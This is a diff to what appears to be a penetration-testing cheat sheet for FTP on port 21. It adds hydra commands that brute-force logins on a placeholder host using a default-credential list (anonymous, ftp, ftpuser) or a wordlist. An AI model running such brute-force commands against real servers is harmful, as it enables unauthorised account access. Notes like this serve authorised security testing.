@@ -1,11 +1,24 @@
 # 21 - FTP
 
+## bruteforce
+
+```
+# default creds
+echo 'anonymous' >> ftpdefaults.txt
+echo 'ftpuser' >> ftpdefaults.txt
+echo 'ftp' >> ftpdefaults.txt
+hydra -L ftpdefaults.txt -P ftpdefaults.txt ftp://RHOST
+
+# known username
+hydra -l USERNAME -P WORDLIST ftp://RHOST
+```
+
 ## Default creds
 
 ```
-anonymous : anonymous
-ftp : ftp
-ftpuser : ftpuser
+anonymous
+ftpuser
+ftp
 ```
 
 ```
